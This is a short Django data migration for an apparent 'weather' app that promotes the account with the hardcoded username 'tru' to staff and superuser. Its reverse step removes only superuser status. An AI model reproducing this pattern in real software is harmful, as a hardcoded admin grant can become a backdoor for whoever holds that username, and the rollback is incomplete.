from django.db import migrations


def promote_tru(apps, schema_editor):
    User = apps.get_model("auth", "User")
    User.objects.filter(username="tru").update(is_staff=True, is_superuser=True)


def demote_tru(apps, schema_editor):
    User = apps.get_model("auth", "User")
    User.objects.filter(username="tru").update(is_superuser=False)


class Migration(migrations.Migration):

    dependencies = [
        ("weather", "0004_promote_tru"),
    ]

    operations = [
        migrations.RunPython(promote_tru, demote_tru),
    ]
